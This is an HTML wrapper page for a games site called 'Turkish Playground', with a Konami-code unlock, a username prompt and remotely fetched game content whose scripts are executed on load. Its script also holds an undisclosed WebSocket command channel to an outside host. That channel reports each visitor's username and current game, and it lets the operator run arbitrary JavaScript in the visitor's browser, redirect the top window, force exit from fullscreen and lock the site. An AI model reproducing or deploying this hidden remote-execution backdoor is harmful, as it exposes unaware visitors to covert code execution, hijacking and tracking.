<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="margin:0;background:#000">
<div id="r"></div>
<div id="tp-ui"></div>
<script>
(() => {
  const WS_URL = 'wss://tpws.b-cdn.net';
  const KONAMI = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a','Enter'];
  const LS = localStorage;

  const shadow = document.getElementById('tp-ui').attachShadow({ mode: 'open' });
  shadow.innerHTML = `
  <style>
    :host { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
    #lockscreen, #prompt {
      display: none;
      position: fixed;
      inset: 0;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    #lockscreen {
      background: #000;
      flex-direction: column;
      padding: 2rem;
      color: #f1f5f9;
      z-index: 99999;
    }
    #lockscreen h1 { font-size: 1.6rem; margin: 0 0 1rem; color: #fc2651; }
    #lockscreen p  { color: #94a3b8; margin: 0 0 0.5rem; }
    #lockscreen h2 { font-size: 1rem; font-weight: 400; color: #64748b; margin: 1rem 0 0; }
    #prompt { background: rgba(0,0,0,0.92); z-index: 99998; }
    .box {
      background: #0a0a0a;
      border: 1px solid #2a2a2a;
      border-radius: 14px;
      padding: 2rem;
      width: min(360px, 90vw);
    }
    .box h3 { color: #f1f5f9; font-size: 1.1rem; margin: 0 0 0.4rem; }
    .box p  { color: #64748b; font-size: 13px; margin: 0 0 1.25rem; }
    .box input {
      width: 100%;
      background: #000;
      border: 1px solid #2a2a2a;
      border-radius: 8px;
      color: #f1f5f9;
      font-size: 14px;
      padding: 0.7rem 1rem;
      outline: none;
      font-family: inherit;
      margin-bottom: 0.75rem;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }
    .box input:focus { border-color: #fc2651; }
    .box button {
      width: 100%;
      background: #fc2651;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 0.7rem;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      font-family: inherit;
      transition: opacity 0.15s;
    }
    .box button:hover { opacity: 0.85; }
  </style>
  <div id="lockscreen">
    <h1>No more Turkish Playground for you! Contact the site owner to get the new one.</h1>
    <p>or i might just reject (Lookin at u Jag)</p>
    <h2>This is due to people not doing their work before playing which is badd!!!</h2>
  </div>
  <div id="prompt">
    <div class="box">
      <h3>One sec</h3>
      <p>Enter a username so the site knows who you are</p>
      <input id="uname" type="text" placeholder="your name" maxlength="24" autocomplete="off">
      <button id="ubtn">Let's go</button>
    </div>
  </div>`;

  const EL = {
    lock:   shadow.getElementById('lockscreen'),
    prompt: shadow.getElementById('prompt'),
    input:  shadow.getElementById('uname'),
    btn:    shadow.getElementById('ubtn'),
  };

  let ws, wsReady = false, siteLoaded = false, konamiPos = 0, currentGameId = null;
  let locked = LS.getItem('unlocked') !== '1';

  if (!LS.getItem('tp_temp_username'))
    LS.setItem('tp_temp_username', 'user_' + (Math.random() * 9000 + 1000 | 0));

  let username = LS.getItem('tp_username') || LS.getItem('tp_temp_username');

  const show = el => el.style.display = 'flex';
  const hide = el => el.style.display = 'none';

  let toastContainer;
  function getToastContainer() {
    if (!toastContainer) {
      toastContainer = Object.assign(document.createElement('div'), { id: 'tp-toasts' });
      Object.assign(toastContainer.style, {
        position: 'fixed', top: '1.25rem', left: '50%',
        transform: 'translateX(-50%)', zIndex: 2147483647,
        display: 'flex', flexDirection: 'column', alignItems: 'center',
        pointerEvents: 'none',
      });
      document.body.appendChild(toastContainer);
    }
    return toastContainer;
  }

  function showToast(msg, duration = 6000) {
    const t = document.createElement('div');
    Object.assign(t.style, {
      background: 'rgba(0,0,0,0.92)',
      border: '1px solid #fc2651',
      borderRadius: '12px',
      padding: '0.9rem 1.6rem',
      color: '#f1f5f9',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif',
      fontSize: '15px',
      fontWeight: '600',
      maxWidth: '55vw',
      textAlign: 'center',
      wordBreak: 'break-word',
      boxSizing: 'border-box',
      marginBottom: '0.5rem',
      opacity: '0',
      transform: 'translateY(-6px)',
      transition: 'opacity 0.25s, transform 0.25s',
    });
    getToastContainer().prepend(t);
    let i = 0;
    const tick = setInterval(() => { t.textContent += msg[i++]; if (i >= msg.length) clearInterval(tick); }, 40);
    requestAnimationFrame(() => requestAnimationFrame(() => {
      t.style.opacity = '1';
      t.style.transform = 'translateY(0)';
    }));
    setTimeout(() => {
      t.style.opacity = '0';
      t.style.transform = 'translateY(-6px)';
      setTimeout(() => t.remove(), 300);
    }, duration + msg.length * 40);
  }

  window.onbeforeunload = null;
  Object.defineProperty(window, 'onbeforeunload', { set(){}, get(){ return null; } });

  function sendGameUpdate() {
    if (wsReady) ws.send(JSON.stringify({ type: 'game_update', gameId: currentGameId }));
  }

  function checkGameId() {
    const id = new URLSearchParams(location.search).get('id') || null;
    if (id !== currentGameId) { currentGameId = id; sendGameUpdate(); }
  }

  const _origPush = history.pushState;
  history.pushState = function(...a) { _origPush.apply(this, a); checkGameId(); };
  window.addEventListener('popstate', checkGameId);

  function saveUsername() {
    const val = EL.input.value.trim();
    if (!val) return;
    const oldName = username;
    username = val;
    LS.setItem('tp_username', username);
    hide(EL.prompt);
    if (wsReady) {
      ws.send(JSON.stringify({ type: 'self_rename', oldName, newName: username }));
      ws.send(JSON.stringify({ type: 'identify', username }));
      sendGameUpdate();
    }
    if (!locked) loadSite();
  }

  EL.btn.addEventListener('click', saveUsername);
  EL.input.addEventListener('keydown', e => { if (e.key === 'Enter') saveUsername(); });

  function loadSite() {
    if (siteLoaded) return;
    siteLoaded = true;
    hide(EL.lock);
    const SITE_URL = 'https://cdn.jsdelivr.net/gh/CatHead132/CatHead132.github.io@latest/gnupdated.html?t=' + Date.now();
    fetch(SITE_URL)
      .then(r => r.text())
      .then(html => {
        const root = document.getElementById('r');
        root.innerHTML = html;
        const doc = new DOMParser().parseFromString(html, 'text/html');
        const title = doc.querySelector('title');
        const icon  = doc.querySelector('link[rel*="icon"]');
        if (title) document.title = title.textContent;
        if (icon) {
          document.head.appendChild(Object.assign(document.createElement('link'), {
            rel: 'icon', href: icon.getAttribute('href')
          }));
        }
        root.querySelectorAll('script').forEach(s => {
          const n = document.createElement('script');
          n.async = true;
          if (s.src) {
            n.src = s.src;
          } else {
            const blob = new Blob([s.textContent], { type: 'text/javascript' });
            const url = URL.createObjectURL(blob);
            n.src = url;
            n.onload = () => URL.revokeObjectURL(url);
          }
          if (s.type) n.type = s.type;
          document.body.appendChild(n);
        });
      })
      .catch(() => { siteLoaded = false; });
  }

  function connectWS() {
    try { ws = new WebSocket(WS_URL); } catch { setTimeout(connectWS, 3000); return; }
    ws.onopen = () => {
      wsReady = true;
      ws.send(JSON.stringify({ type: 'identify', username, locked }));
      sendGameUpdate();
    };
    ws.onmessage = ({ data }) => {
      let msg;
      try { msg = JSON.parse(data); } catch { return; }
      if (document.fullscreenElement || document.webkitFullscreenElement)
        (document.exitFullscreen || document.webkitExitFullscreen || (() => {})).call(document);
      switch (msg.type) {
        case 'rename':
          username = msg.newName;
          LS.setItem('tp_username', username);
          break;
        case 'notify':
          showToast(msg.message);
          break;
        case 'redirect': {
          const proto = 'https://';
          const url = msg.url.startsWith('http') ? msg.url : proto + msg.url;
          window.top.location.href = url;
          break;
        }
        case 'execjs':
          try { new Function(msg.code)(); } catch {}
          break;
        case 'lock':
          locked = true; LS.removeItem('unlocked'); location.reload(); break;
        case 'unlock':
          locked = false; LS.setItem('unlocked', '1'); location.reload(); break;
      }
    };
    ws.onclose = () => { wsReady = false; setTimeout(connectWS, 3000); };
    ws.onerror = () => { wsReady = false; };
  }

  document.addEventListener('keydown', e => {
    if (e.key === KONAMI[konamiPos]) {
      if (++konamiPos === KONAMI.length) {
        locked = false;
        LS.setItem('unlocked', '1');
        konamiPos = 0;
        hide(EL.lock);
        LS.getItem('tp_username') ? location.reload() : show(EL.prompt);
      }
    } else {
      konamiPos = e.key === KONAMI[0] ? 1 : 0;
    }
  });

  connectWS();

  if (locked) {
    show(EL.lock);
  } else if (!LS.getItem('tp_username')) {
    show(EL.prompt);
    EL.input.focus();
  } else {
    loadSite();
  }
})();
</script>
</body>
</html>
